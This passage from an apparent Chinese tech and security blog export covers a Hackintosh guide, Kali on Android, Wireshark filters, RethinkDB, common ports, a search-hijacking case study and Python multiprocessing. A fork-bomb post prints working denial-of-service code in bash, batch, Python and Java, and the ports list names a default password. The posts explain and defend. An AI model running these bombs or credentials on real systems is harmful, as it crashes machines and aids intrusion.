如果点击安装，没有反应，则需要打开电脑磁盘管理（右击计算机，管理），给那个100M的隐藏磁盘分配盘符（注意不能分配A盘符，其余的盘符都可以分配），分配完后，重新打开变色龙安装程序，重新安装。安装完成后，会在C盘或者100M的系统隐藏盘生成3个隐藏文件。这3个文件是变色龙的引导文件。 安装HFS直接双击运行，一路安装，具体作用自行百度吧。 给电脑分区首先分配一个8G大小的区，注意不要格式化。（用来放OSX安装程序，相当于硬盘安装盘）然后再分配个大小不上限的区，注意不要格式化。（用来安装OSX，相当于windows的C盘） 打开硬盘助手将下载好的系统盘（我用的是懒人版，7.5G大小），写入刚分配好的8G大小的磁盘中，需要等到几分钟。。。 DiskGenius Pro 4.30（查看磁盘状态工具）将刚才分的2个磁盘（8G，不上限大小），标识都设置为AF。右击更改参数，直接改为AF。 将EFI文件放入安装盘根目录即放在那个8G大小的盘根目录。注意：如果打开资源管理器，看不到8G的那个磁盘，可以重启电脑再看看。实在没有，估计是磁盘分区有问题，可能就需要重装系统了。 EDID注入EFI下面有一个config.split文件，需要替换成自己电脑的edid（替换方法自行百度），这个文件是clover引导的配置文件，至关重要。 将Clover.iso替换wowpc.iso将clover.iso重命名为wowpc.iso，然后替换C盘或者隐藏盘下的wowpc.iso。这样变色龙引导会直接跳转到clover引导。 安装阶段 安装的过程中，最主要的是看会不会卡logo，或者黑屏。如果出现这2种情况，绝大部分原因是config.split配置文件的问题。如果一切正常，那么会成功进入安装界面，在选择安装到哪个盘时，要先选择菜单栏上的磁盘工具找到那个分配的准备拿来存放OSX系统的磁盘，选择抹掉，格式为OS（日志格式），再回到安装界面，就会发现可以选择那个磁盘进行安装了。 驱动配置 等到安装完成，就差不多可以用了，但是无线网卡驱动跟声音驱动还没有弄好。 安装无线网卡驱动：改无线网卡2a为2b，方法为finder进10.11系统盘system/library/extensions/,找到IO82011Family.kext，右键显示包内容找到/contents/Pluglus/AirportAtheros40.kext，继续右键显示包内容，找到contents/Info.pilst，用plistEdit Pro（自行百度安装该软件）打开，找到：12345678&lt;array&gt; &lt;string&gt;pci168c,30&lt;/string&gt; &lt;string&gt;pci168c,2a&lt;/string&gt; &lt;string&gt;pci106b,0086&lt;/string&gt; &lt;string&gt;pci168c,1c&lt;/string&gt; &lt;string&gt;pci168c,23&lt;/string&gt; &lt;string&gt;pci168c,24&lt;/string&gt;&lt;/array&gt; 代码，将第三行里面的2a改为2b，保存退出，之后用KCPM Utility Pro.app修复重建缓存，重启。重启之后无线网卡应该能成功驱动了。 安装声卡驱动：即AppleHDA.kext驱动，删除system/library/extensions/AppleHDA.kext后，用KCPM Utility Pro进行安装，路径也为system/library/extensions/，安装完成之后重建缓存即可。 截图见证 提醒：以上过程只适用于联想Z470，其他机型请上网查资料…… 参考：远景论坛]]></content>
      <categories>
        <category>折腾不止</category>
      </categories>
      <tags>
        <tag>黑苹果</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安卓版Kali-linux]]></title>
    <url>../../../../../../../../2017/02/10/安卓版Kali-linux/</url>
    <content type="text"><![CDATA[有时候折腾仅仅只是为了折腾，仅此而已！据说OPPO拍照神器最近很火，于是便凑热闹买了一款（R9s），外形不错，性能说得过去。尤其是自拍功能爱不释手（……），于是手头原本的小米便闲置了出来。作为一名崇尚节俭持家的技术男，当然是要废物利用一番，于是便有了以下的一番折腾。 我的目的是打造一款渗透测试专用手机，最先想到的方案是在手机上安装kali-linx系统，因为该系统集成了很多渗透测试工具，解决了很多依赖问题，省去不少麻烦。那么问题来了，怎么在手机上安装kali-linux系统呢？在查找了一些资料之后，我理了理思路：（1）手机需要root（2）手机上安装linux-deploy（3）在linux-deploy上安装kali（4）在kali里面安装渗透测试工具思路有了，那么让我们撸起袖子干起来吧！(以下提到的安装包会在文章最后提供下载！) Root 起初看到网上的一些教程，介绍root手机非常简单，下载第三方软件，便可一键root。于是抱着轻松地态度在电脑上下载了一款软件（root精灵），接着将手机连上电脑，便开始点击一键root了。过了几分钟提示root成功，心想，原来破解手机这么简单，刚想吐槽小米，打开手机便发现根本没有root成功，NM坑爹。然后卸载了此软件，又重新找了一款（root大师），结果同样如此。 心中默默骂了几条街后，喝口水冷静了会，重新上网搜索资料，竟然无意看到了小米官方提供开发者版本的安装包（晕倒，所以不能盲目使用第三方软件，一般厂商会给出相应的软件或者安装包）。 官方下载地址：http://www.miui.com/download-241.html 根据官方提供的教程安装即可（我选择了第二种安装方式），安装完以后在安全中心授予应用程序root权限，其他品牌的手机请自行百度，方法大同小异。 安装linux-deploy Linux deploy是一个可以快速在Android设备上安装运行Linux操作系统的App,遵循GPLv3协议，运行需要root权限。linux-deploy软件介绍：http://www.cnblogs.com/mzlw/p/4841707.html在手机上安装完linux-deploy，运行后进行配置：运行界面如上图所示，点击右下角进行配置：发行版选择：kali-linux；源地址选择国内镜像：http://202.141.160.110/kali/勾选上ssh,vnc，在启动系统后会自动开启ssh以及vnc服务，方便远程管理。配置完成后点击安装，等待一会。安装完以后点击启动，如若成功，便可以用ssh工具连接此系统。 注：linux-deploy只是一款软件，安装它对应手机本身不会造成什么影响（除了占用存储空间），也不会清空数据（不是刷机） linux-deploy安装kali参考：http://www.freebuf.com/articles/terminal/13209.htmlhttp://www.freebuf.com/articles/terminal/47817.html kali上安装渗透工具 虽然手机上安装kali成功了，但是此kali系统上并没有任何工具，需要自己安装。因为kali官方的源太慢了，因此建议更换国内的源。手机上安装一个ssh远程连接工具，连接上kali系统，并输入以下命令：1vim /etc/apt/sources.list 清空文件内容并添加以下内容：12deb http://202.141.160.110/kali/ kali-rolling main contrib non-freedeb-src http://202.141.160.110/kali kali-rolling main contrib non-free 更换完以后，更新源：123sudo su #切换到root用户apt-get updateapt-get upgrade 安装工具：1234apt-get install nmapapt-get install sqlmapapt-get install metasploit-framework...... 运行截图：运行速度还行，方便携带，居家旅行必备神器！ 其他安全工具 除了在安卓手机上安装kali系统以外，很多安全软件也支持安卓系统，比如dsploit、busybox、nmap for android等。首先在手机上安装busybox软件（授予root权限），运行软件以后勾选上智能安装选项，然后点击安装busybox。安装完busybox后，才可以使用dsploit等软件，当然这些软件也都是需要root权限的。至于这些安全软件的用法，网上一搜一大推，这里便不再介绍了。 软件工具下载链接: https://pan.baidu.com/s/1miqcGjQ 密码: ch5f]]></content>
      <categories>
        <category>折腾不止</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【渗透神器系列】WireShark]]></title>
    <url>../../../../../../../../2017/02/09/WireShark过滤规则/</url>
    <content type="text"><![CDATA[漫步在数据的汪洋大海 wireshark是一款网络流量抓取分析神器，也是安全工具使用排行中排名第一的工具。使用wireshark必须要牢记一些常用的数据包过滤规则，对于寻找一些特定的包会事半功倍。 IP过滤ip源地址： ip.src ip.src==10.0.3.109ip目的地址: ip.dst ip.dst==10.0.3.114 端口过滤tcp.port==80 所有端口为80的包tcp.dstport==80 目的端口为80的包tcp.srcport==80 源端口为80的包 协议过滤httptcpicmp……. http模式过滤http.request.method==”GET” 查找GET包http.request.method==”POST” 查找POST包 连接符and &amp;or || 自助模式可以打开wireshark的Expression会弹出Filter Expression窗口： 传送门【渗透神器系列】Metasploit【渗透神器系列】DNS信息查询【渗透神器系列】Fiddler【渗透神器系列】nmap【渗透神器系列】搜索引擎【渗透神器系列】nc]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>渗透神器</tag>
        <tag>wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Rethinkdb搭建与使用]]></title>
    <url>../../../../../../../../2017/02/07/rethinkdb搭建与使用/</url>
    <content type="text"><![CDATA[首先惊喜rethinkdb开源了，为开源精神点赞（无论背后是哪种原因）……既然如此，就来介绍一下Nosql界的黑科技–rethinkdb吧。我与rethibkdb相识于16年夏，因为一个项目的需要，当时徘徊于mongodb与rethinkdb之间，但最终还是选择了rethinkdb，两者之间的好坏暂且不论，我也只是用其一点皮毛，这里结合自身使用以及官方介绍简单记录一番。 rethinkdb属于Nosql数据库，它具有可视化管理，支持多平台等优点，如果我们需要实时的数据时，它是最为合适的。当然在使用过程中，我也发现了一点它的一点缺陷，不支持多线程储存（很有可能是因为我没有用好，当时时间紧迫，也没来得及去解决，如有解决方案，期望告知一二）。详细介绍请参考：https://rethinkdb.com/faq/ rethinkdb分为server与client，server端也就是搭建的rethinkdb数据库，用于储存以及提供服务；clinet是用来连接操作数据库内容的，支持多种编程语言。 Server端安装使用server安装支持平台：linux，windows，mac ubuntu安装直接使用apt-get安装：1234source /etc/lsb-release &amp;&amp; echo "deb http://download.rethinkdb.com/apt $DISTRIB_CODENAME main" | sudo tee /etc/apt/sources.list.d/rethinkdb.listwget -qO- https://download.rethinkdb.com/apt/pubkey.gpg | sudo apt-key add -sudo apt-get updatesudo apt-get install rethinkdb 运行rethinkdb服务：123456$ rethinkdbinfo: Creating directory /home/user/rethinkdb_datainfo: Listening for intracluster connections on port 29015info: Listening for client driver connections on port 28015info: Listening for administrative HTTP connections on port 8080info: Server ready 其他安装方式请参考：https://rethinkdb.com/docs/install/ubuntu/ windows安装下载安装包：https://download.rethinkdb.com/windows/rethinkdb-2.3.5.zip运行rethinkdb程序：123C:\Users\Slava\&gt;cd RethinkDBC:\Users\Slava\RethinkDB\&gt;C:\Users\Slava\RethinkDB\&gt;rethinkdb.exe 注意：运行rethinkdb数据库后，默认开启8080端口，访问localhost:8080展示的web页面用来管理数据库；默认开启29015端口，用来连接客户端交互数据。web管理页面： Client端安装使用Client端支持编程语言：javascript，ruby，python，java，这里以python举例。 pythonInstall1sudo pip install rethinkdb Usage123456789101112131415161718192021import rethinkdb as rclass dbOperation(): def __init__(self,dbname,tablename): self.conn = r.connect(host="localhost",port=29015) self.table = r.db(dbname).table(tablename) def Insert(self,document): ''' 插入记录到数据库 ''' return self.table.insert(document, conflict="update").run(self.conn) def query(self,**kwargs): ''' 自定义查询 ''' f=self.table.run(self.conn) ##选择网站名称为空的记录。 content=[] for i in f: content.append(i) return content 详情请参考：https://rethinkdb.com/docs/cookbook/python/ Data Explorer工具这是rethinkdb自带的一个工具，可用执行数据库语句，查询修改数据库内容。 常用语句12345678910111213141516171819202122232425r.db("").table("").count()r.db("").table("").filter(&#123;"":""&#125;)r.table('movies').filter(&#123;rank: 1&#125;)r.db("Domain_fenlei").table("hangye_1").filter(r.row("hangye").ne("No Type")) hangye不等于No Typeeq等于ne neq不等于gt &gt;lt &lt;le &lt;=ge &gt;=not 非mod 求模r.table('movies').without('id').distinct().count() 删除重复项r.table('moviesUnique').orderBy('rank').limit(10) 显示前十大电影r.table('moviesUnique').orderBy(r.desc('rank')).limit(10)filter(r.row("last_link").ne(r.row("true_link"))) #last_link不等于true_linkr.db("ALJC").table("MALINK_0301").withFields("Date") 只显示Date字段r.db("IP").table("Domain_Location").without("Date") 去除Date字段r.db("IP").table("Domain_Location").hasFields('city') 显示存在city字段的记录r.db("IP").table("Domain_Location").filter(function(user)&#123;return user.hasFields("city").not()&#125;) 显示不存在city字段的记录 详情请参考：https://rethinkdb.com/docs/reql-data-exploration/]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>rethinkdb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fork Bomb]]></title>
    <url>../../../../../../../../2017/02/04/Fork-Bomb/</url>
    <content type="text"><![CDATA[Fork炸弹（fork bomb）在计算机领域中是一种利用系统调用fork（或其他等效的方式）进行的拒绝服务攻击。fork炸弹以极快的速度创建大量进程（进程数呈以2为底数的指数增长趋势），并以此消耗系统分配予进程的可用空间使进程表饱和，而系统在进程表饱和后就无法运行新程序，除非进程表中的某一进程终止，它可以利用在windows/linux等系统。 linux系统Code1:()&#123; :|:&amp; &#125;;: 注解:() # 定义函数,函数名为”:”,即每当输入”:”时就会自动调用{}内代码{ # “:”函數起始字元: # 用递归方式调用”:”函数本身| # 並用管線(pipe)將其輸出引至…（因为有一个管線操作字元，因此會生成一個新的進程）: # 另一次递归调用的”:”函数 # 综上,”:|:”表示的即是每次調用函数”:”的時候就會產生兩份拷貝&amp; # 調用間脱鉤,以使最初的”:”函数被關閉後為其所調用的兩個”:”函數還能繼續執行} # “:”函數終止字元; # “:”函数定义结束后将要进行的操作…: # 调用”:”函数,”引爆”fork炸弹 Windows系统(创建一个.bat，写入以下命令运行即可)Code1%0|%0|%0 注释%0就是输出自己本身,也就是.bat，在cmd中即表示运行.bat|%0就是打开自身后的程序再打开.bat3的指数倍 预防一个防止其严重影响系统的方法就是限定一个用户能够创建的进程数的上限，在Linux系统上，可以通过ulimit这个指令达到相应的效果。 编程语言应用Using Python: 123import oswhile 1: os.fork() Using Java: 12345678910public class ForkBomb&#123; public static void main(String[] args) &#123; while(true) &#123; Runtime.getRuntime().exec(new String[]&#123;"javaw", "-cp", System.getProperty("java.class.path"), "ForkBomb"&#125;); &#125; &#125;&#125; 官方参考链接：https://en.wikipedia.org/wiki/Fork_bomb]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>ForkBomb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常用端口服务]]></title>
    <url>../../../../../../../../2017/01/24/常用端口服务/</url>
    <content type="text"><![CDATA[范围：0-65535固定端口：0-1023 1024保留动态端口：1024-65535 常用端口21：FTP22：SSH23：Telnet25：SMTP53：DNS（UDP）69：TFTP（cisco，类似FTP）79：Finger80：HTTP110：POP3111：RPC 远程过程调用113：windows 验证服务119：NNTP 网络新闻组传输协议135：RPC 远程过程调用137：NetBIOS139：windows文件和打印机共享，Unix中的samba服务161：SNMP 简单网络管理协议389：LDAP443：HTTPS445：SMB1080：socks代理服务2601,2604：zebra路由，默认密码zebra5900：vnc8080：用户www代理服务 木马病毒5554：worm.Sasser病毒利用端口7626：冰河病毒8011：WAY2.4病毒7306：Netspy3.0病毒1024：YAI病毒 中间件7001,7002：weblogic9080：webshpere应用程序9090：webshpere管理工具8080：tomcat默认端口Jboss通常占用的端口是1098，1099，4444，4445，8080，8009，8083，8093，默认为8080 数据库3306：mysql1433：sqlserver server1434：sqlserver monitor1521：oracle5432：PostgreSQL1158：ORACLE EMCTL8080：Oracle XDB2100：Oracle XDB FTP 特殊服务（漏洞）443：SSL心脏滴血512,513,514：Rsync未授权访问873：Rsync未授权访问2375：docker remote api漏洞5984：CouchDB6379：redis未授权7001,7002：WebLogic 默认弱口令，反序列化9200,9300：elasticsearch未授权访问11211：memcache未授权访问27017,27018：Mongodb 未授权访问28017：mongodb统计页面50000：SAP命令执行50070,50030：hadoop默认端口未授权访问 参考链接：https://www.secpulse.com/archives/54880.html]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>常用端口</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搜索引擎劫持案列分析]]></title>
    <url>../../../../../../../../2017/01/17/2/</url>
    <content type="text"><![CDATA[随着近期支付宝安全漏洞的曝光，网络安全问题也变得日趋严重，作为信息安全从业者，深感肩上负担之沉重，路漫漫其修远兮。然而可以预见的是，不久的将来黑帽与白帽之间必将展开一场较量，各大行业各大领域都将牵涉其中，谓之生死之战也不为过。为了给日后决战做准备，此时此刻我们必须全面了解这些未知而神秘的对手。 黑客的非法入侵行为一般有几大目的，其中最主要的便是经济利益。近几年，国内安全形势不容乐观，地下黑色产业盛行，倒卖公民数据的事件略见不鲜。而要解决这一切的根源问题，就是要深入黑产内部了解整条黑色产业链。 黑产的形式多种多样，有些是直接了当型的，比如入侵网站服务器获取数据并倒卖；也有些形式比较隐蔽，比如搜索引擎劫持获取流量，看似悄无声息实则背后暗藏着一条冗长的黑色之链。 当我与朋友说起“黑客”一词时，它们脑海里的感觉往往是神秘而遥远……然而它们离我们却很近。负责客户网站安全是我的日常工作之一，平常除了分析网站的安全漏洞之外，我还会通过一些其他常见工具去分析网站的整体安全性，比如：搜索引擎。我相信，绝大部分人每天都会接触搜索引擎，但可能一些细节我们从没关注过，而无形中，我们可能成为了黑色产业链的一部分。 搜索引擎是每个网站通往客户最直接的方式，我相信大部分人访问网站借助于搜索引擎。对于我来说，搜索引擎还有另外一项功能，查看网站的状态（排名，收录情况，安全性等）。 通常来说，每天我都会打开搜索引擎查询网站的安全情况，今天也不例外，然而当我在查询关于某个客户网站的信息时，却出现了一些奇怪的敏感内容： 某政府网站上出现了博彩相关内容（排除新闻页面），这显然是不合规的。排除管理员失误添加导致，恐怕此网站多半是被黑客入侵了。抱着谨慎的态度，我决定深入研究一番。 首先我访问了该记录上的链接，紧接着浏览器中出现了一个正常的政府页面，而也就须臾之间，网页瞬间又跳转到了博彩网页。图一为正常政府页面：图二为博彩页面： 可以看到博彩页面的域名为www.0980828.com，显然不是先前的政府网站域名xxxx.gov.cn。看到此现象，再结合多年安全经验，我大致能够猜测此网站应该是被搜索引擎劫持了。所谓搜索引擎劫持是目前黑帽SEO或者说黑产最喜欢的一种网页引流方式，此手法往往通过入侵政府、教育机构网站（权重高），修改网站源代码、放寄生虫程序、设置二级目录反向代理等实现。搜索引擎劫持可以分为服务端劫持、客户端劫持、百度快照劫持、百度搜索劫持等等；表现形式可以是劫持跳转，也可以是劫持呈现的网页内容，目前被广泛应用于私服、博彩等暴利行业。 通过分析以上过程的数据包，我们不难发现，在该网站前端页面被嵌入了一段非法代码。此代码存放在43.250.75.61服务器上，查看该服务器信息，发现其在日本。而通过访问此段代码，返回内容则是跳转到www.0980828.com网站上。 分析至此，我们不难发现，导致页面跳转的原因便是xxxx.gov.cn网页被非法嵌入了一窜代码，而此代码能够控制访问该网页时跳转到博彩页面。这是搜索引擎劫持最为基础且常见的一种方式，其变种甚多，类型方式也各异，根据一段时间的调查学习我也总结了一些相关内容，详情可以参考搜索引擎劫持手法分析 当政府网站被挂博彩等敏感内容，其危害不言而喻。意识后问题严重性后，我立马联系了网站管理员，告知其详细情况，并帮助其整改。我们必须明白，搜索引擎劫持不是漏洞，只是一种黑产的表现形式。因此想要解决搜索引擎劫持问题，首先要解决网站本身的安全问题。 细细回想一番，曾几何时当我们通过搜索引擎打开一个正常网页时，是否存在跳转到其他非法页面的情况。很有可能，那便是一个被搜索引擎劫持的网站，而当我们点击链接的那一刻，便成为了黑色产业链的一部分，因为我们为其带去了流量。 小结：在这个信息飞速发展的时代，用户流量便是看不见的黄金财富]]></content>
      <categories>
        <category>黑产研究</category>
      </categories>
      <tags>
        <tag>黑帽seo</tag>
        <tag>网页劫持</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【Multiprocessing系列】共享资源]]></title>
    <url>../../../../../../../../2016/11/24/Multiprocessing共享资源/</url>
    <content type="text"><![CDATA[在使用多进程的过程中，最好不要使用共享资源，如果非得使用，则请往下看。Multiprocessing类中共享资源可以使用3种方式，分别是Queue，Array，Manager。这三个都是Multiprocessing自带的组件，使用起来也非常方便。注意：普通的全局变量是不能被子进程所共享的，只有通过Multiprocessing组件构造的数据结构可以被共享。 Queue类使用Multiprocessing.Queue类，共享资源（share memory）（只适用Process类） 1234567891011from multiprocessing import Process, Queue def test(queue): queue.put("Hello World") if __name__ == '__main__': q = Queue() p = Process(target=test, args=(q,)) #需要将q对象传递给子进程 p.start() print q.get() 缺点：不能再Pool进程池中使用。 Array、Value类使用Multiprocessing.Array类，共享资源（share memory）（只适用于Process类） 123456789101112from multiprocessing import Process, Arraydef test(a): for i in range(len(a)): a[i] = -a[i]if __name__ == '__main__': arr = Array('i', range(10)) p = Process(target=test, args=(arr)) #需要将arr对象传递给子进程 p.start() p.join() print arr[:] 缺点：无法与Pool一起使用。 Manager类使用Multiprocessing.Manager类，共享资源。（可以适用Pool类） 说明：由于windows操作系统下，创建Multiprocessing类对象代码一定要放在main()函数下，而linux不需要，因此这里区分2个版本。 实例目的：父进程在执行子进程的过程中，同步判断一个公共资源值，如果满足条件则结束所有进程。 linux版本1234567891011121314151617181920from multiprocessing import Manager,Poollists=Manager().list() ##定义可被子进程共享的全局变量listsdef test(i): print i lists.append(i)if __name__=="__main__": pool=Pool() for i in xrange(10000000): ''' 判断如果lists长度大于0，则不再往进程池中添加进程。 ''' if len(lists)&lt;=0: pool.apply_async(test,args=(i,)) else: break pool.close() pool.join() 优点：可以跟Pool一起用，且速度比较快。 windows版本1234567891011121314151617from multiprocessing import Managerdef test(i,lists): print i lists.append(i)if __name__=="__main__": pool=Pool() lists=Manager().list() #Manager类实例化代码只能写在main()函数里面 for i in xrange(10000000): if len(lists)&lt;=0: ''' 在创建子进程时，需要将lists对象传入，不然无法共享。 ''' pool.apply_async(test,args=(i,lists))##需要将lists对象传递给子进程，这里比较耗资源，原因可能是因为Manager类是基于通信的。 else: break 说明：与linux版本代码相比，windows下代码将lists的引用放在了main()之后，因为windows下只能在main函数下引用多进程。而在实例化子进程时，必须把Manager对象传递给子进程，否则lists无法被共享，而这个过程会消耗巨大资源，因此性能很差。缺点：速度很慢，因此在windows下想要提前结束所有进程，可以使用获取返回值的方式，参考Multiprocessing子进程返回值 传送门 【Multiprocessing系列】共享资源【Multiprocessing系列】子进程返回值【Multiprocessing系列】Pool【Multiprocessing系列】Process【Multiprocessing系列】Multiprocessing基础]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>Multiprocessing</tag>
        <tag>多进程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【Multiprocessing系列】子进程返回值]]></title>
    <url>../../../../../../../../2016/11/24/Multiprocessing子进程返回值/</url>
    <content type="text"><![CDATA[在实际使用多进程的时候，可能需要获取到子进程运行的返回值。如果只是用来存储，则可以将返回值保存到一个数据结构中；如果需要判断此返回值，从而决定是否继续执行所有子进程，则会相对比较复杂。另外在Multiprocessing中，可以利用Process与Pool创建子进程，这两种用法在获取子进程返回值上的写法上也不相同。这篇中，我们直接上代码，分析多进程中获取子进程返回值的不同用法，以及优缺点。 初级用法（Pool）目的：存储子进程返回值 说明：如果只是单纯的存储子进程返回值，则可以使用Pool的apply_async异步进程池；当然也可以使用Process，用法与threading中的相同，这里只介绍前者。 实例：当进程池中所有子进程执行完毕后，输出每个子进程的返回值。 1234567891011121314151617181920212223from multiprocessing import Pooldef test(p): return pif __name__=="__main__": pool = Pool(processes=10) result=[] for i in xrange(50000): ''' for循环执行流程： （1）添加子进程到pool，并将这个对象（子进程）添加到result这个列表中。（此时子进程并没有运行） （2）执行子进程（同时执行10个） ''' result.append(pool.apply_async(test, args=(i,)))#维持执行的进程总数为10，当一个进程执行完后添加新进程. pool.join() ''' 遍历result列表，取出子进程对象，访问get()方法，获取返回值。（此时所有子进程已执行完毕） ''' for i in result: print i.get() 错误写法： 123for i in xrange(50000): t=pool.apply_async(test, args=(i,))) print t.get() 说明：这样会造成阻塞，因为get()方法只能等子进程运行完毕后才能调用成功，否则会一直阻塞等待。如果写在for循环内容，相当于变成了同步，执行效率将会非常低。 高级用法（Pool）目的：父进程实时获取子进程返回值，以此为标记结束所有进程。 实例（一）执行子进程的过程中，不断获取返回值并校验，如果返回值为True则结果所有进程。 12345678910111213141516171819202122232425262728from multiprocessing import Poolimport Queueimport timedef test(p): time.sleep(0.001) if p==10000: return True else: return Falseif __name__=="__main__": pool = Pool(processes=10) q=Queue.Queue() for i in xrange(50000): ''' 将子进程对象存入队列中。 ''' q.put(pool.apply_async(test, args=(i,)))#维持执行的进程总数为10，当一个进程执行完后添加新进程. ''' 因为这里使用的为pool.apply_async异步方法，因此子进程执行的过程中，父进程会执行while，获取返回值并校验。 ''' while 1: if q.get().get(): pool.terminate() #结束进程池中的所有子进程。 break pool.join() 说明：总共要执行50000个子进程（并发数量为10），当其中一个子进程返回True时，结束进程池。因为使用了apply_async为异步进程，因此在执行完for循环的添加子进程操作后（只是添加并没有执行完所有的子进程），可以直接执行while代码，实时判断子进程返回值是否有True，有的话结束所有进程。 优点：不必等到所有子进程结束再结束程序，只要得到想要的结果就可以提前结束，节省资源。 不足：当需要执行的子进程非常大时，不适用，因为for循环在添加子进程时，要花费很长的时间，虽然是异步，但是也需要等待for循环添加子进程操作结束才能执行while代码，因此会比较慢。 实例（二）多线程+多进程，添加执行子进程的过程中，不断获取返回值并校验，如果返回值为True则结果所有进程。 1234567891011121314151617181920212223242526272829303132333435363738394041from multiprocessing import Poolimport Queueimport threadingimport timedef test(p): time.sleep(0.001) if p==10000: return True else: return Falseif __name__=="__main__": result=Queue.Queue() #队列 pool = Pool() def pool_th(): for i in xrange(50000000): ##这里需要创建执行的子进程非常多 try: result.put(pool.apply_async(test, args=(i,))) except: break def result_th(): while 1: a=result.get().get() #获取子进程返回值 if a: pool.terminate() #结束所有子进程 break ''' 利用多线程，同时运行Pool函数创建执行子进程，以及运行获取子进程返回值函数。 ''' t1=threading.Thread(target=pool_th) t2=threading.Thread(target=result_th) t1.start() t2.start() t1.join() t2.join() pool.join() 执行流程：利用多线程，创建一个执行pool_th函数线程，一个执行result_th函数线程，pool_th函数用来添加进程池，开启进程执行功能函数并将子进程对象存入队列，而result_th()函数用来不停地从队列中取子进程对象，调用get（）方法获取返回值。等发现其中存在子进程的返回值为True时，结束所有进程，最后结束线程。 优点：弥补了实例（一）的不足，即使for循环的子进程数量很多，也能提高性能，因为for循环与判断子进程返回值同时进行。 传送门 【Multiprocessing系列】共享资源【Multiprocessing系列】子进程返回值【Multiprocessing系列】Pool【Multiprocessing系列】Process【Multiprocessing系列】Multiprocessing基础]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>Multiprocessing</tag>
        <tag>多进程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【Multiprocessing系列】Pool]]></title>
    <url>../../../../../../../../2016/11/24/Multiprocessing-Pool/</url>
    <content type="text"><![CDATA[Multiprocessing.Pool可以提供指定数量的进程供用户调用，当有新的请求提交到pool中时，如果池还没有满，那么就会创建一个新的进程用来执行该请求；但如果池中的进程数已经达到规定最大值，那么该请求就会等待，直到池中有进程结束，才会创建新的进程来执行它。在共享资源时，只能使用Multiprocessing.Manager类，而不能使用Queue或者Array。 Pool介绍用途Pool类用于需要执行的目标很多，而手动限制进程数量又太繁琐时，如果目标少且不用控制进程数量则可以用Process类。 构造方法 Pool([processes[, initializer[, initargs[, maxtasksperchild[, context]]]]]) processes ：使用的工作进程的数量，如果processes是None那么使用 os.cpu_count()返回的数量。 initializer： 如果initializer是None，那么每一个工作进程在开始的时候会调用initializer(*initargs)。 maxtasksperchild：工作进程退出之前可以完成的任务数，完成后用一个新的工作进程来替代原进程，来让闲置的资源被释放。maxtasksperchild默认是None，意味着只要Pool存在工作进程就会一直存活。 context: 用在制定工作进程启动时的上下文，一般使用 multiprocessing.Pool() 或者一个context对象的Pool()方法来创建一个池，两种方法都适当的设置了context。 实例方法 apply_async(func[, args[, kwds[, callback]]]) 它是非阻塞。 apply(func[, args[, kwds]])是阻塞的。 close() 关闭pool，使其不在接受新的任务。 terminate() 关闭pool，结束工作进程，不在处理未完成的任务。 join() 主进程阻塞，等待子进程的退出， join方法要在close或terminate之后使用。 Pool使用方法Pool+map函数说明：此写法缺点在于只能通过map向函数传递一个参数。 1234567891011from multiprocessing import Pooldef test(i): print iif __name__=="__main__": lists=[1,2,3] pool=Pool(processes=2) #定义最大的进程数 pool.map(test,lists) #p必须是一个可迭代变量。 pool.close() pool.join() 异步进程池（非阻塞）123456789101112131415161718192021from multiprocessing import Pooldef test(i): print iif __name__=="__main__": pool = Pool(processes=10) for i in xrange(500): ''' For循环中执行步骤： （1）循环遍历，将500个子进程添加到进程池（相对父进程会阻塞） （2）每次执行10个子进程，等一个子进程执行完后，立马启动新的子进程。（相对父进程不阻塞） apply_async为异步进程池写法。 异步指的是启动子进程的过程，与父进程本身的执行（print）是异步的，而For循环中往进程池添加子进程的过程，与父进程本身的执行却是同步的。 ''' pool.apply_async(test, args=(i,)) #维持执行的进程总数为10，当一个进程执行完后启动一个新进程. print “test” pool.close() pool.join() 执行顺序：For循环内执行了2个步骤，第一步：将500个对象放入进程池（阻塞）。第二步：同时执行10个子进程（非阻塞），有结束的就立即添加，维持10个子进程运行。（apply_async方法的会在执行完for循环的添加步骤后，直接执行后面的print语句，而apply方法会等所有进程池中的子进程运行完以后再执行后面的print语句） 注意：调用join之前，先调用close或者terminate方法，否则会出错。执行完close后不会有新的进程加入到pool,join函数等待所有子进程结束。 同步进程池（阻塞）1234567891011121314151617181920from multiprocessing import Pooldef test(p): print p time.sleep(3)if __name__=="__main__": pool = Pool(processes=10) for i in xrange(500): ''' 实际测试发现，for循环内部执行步骤： （1）遍历500个可迭代对象，往进程池放一个子进程 （2）执行这个子进程，等子进程执行完毕，再往进程池放一个子进程，再执行。（同时只执行一个子进程） for循环执行完毕，再执行print函数。 ''' pool.apply(test, args=(i,)) #维持执行的进程总数为10，当一个进程执行完后启动一个新进程. print “test” pool.close() pool.join() 说明：for循环内执行的步骤顺序，往进程池中添加一个子进程，执行子进程，等待执行完毕再添加一个子进程…..等500个子进程都执行完了，再执行print “test”。（从结果来看，并没有多进程并发） 传送门 【Multiprocessing系列】共享资源【Multiprocessing系列】子进程返回值【Multiprocessing系列】Pool【Multiprocessing系列】Process【Multiprocessing系列】Multiprocessing基础]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>Multiprocessing</tag>
        <tag>多进程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【Multiprocessing系列】Process]]></title>
    <url>../../../../../../../../2016/11/24/Multiprocessing-Process/</url>
